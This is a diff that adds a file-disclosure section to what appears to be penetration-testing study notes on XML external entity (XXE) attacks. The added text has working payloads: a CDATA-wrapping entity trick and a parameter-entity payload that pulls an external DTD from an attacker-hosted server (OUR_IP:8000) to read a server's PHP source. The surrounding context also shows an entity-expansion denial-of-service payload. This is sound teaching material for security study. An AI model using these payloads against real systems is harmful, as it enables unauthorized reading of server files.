@@ -102,4 +102,38 @@ Now, we can use the following XML code to execute a curl command that downloads 
   </root>
   ```
   This payload defines the a0 entity as DOS, references it in a1 multiple times, references a1 in a2, and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference.
- 
+
+ ## File Disclosure
+
+ ### CDATA
+ To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
+ We can define a begin internal entity with `<![CDATA[`, an end internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
+ ```
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+After that, if we could reference the `&joined;` entity, but this probably won't work, since XML prevents joining internal and external entities.
+To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.
+Host this file in a DTD (e.g. xxe.dtd):
+```
+<!ENTITY joined "%begin;%file;%end;">
+```
+We can use `python3 -m http.server 8000` as usual.
+Then reference it as an external entitiy on the target web applicaiton:
+```
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+
+
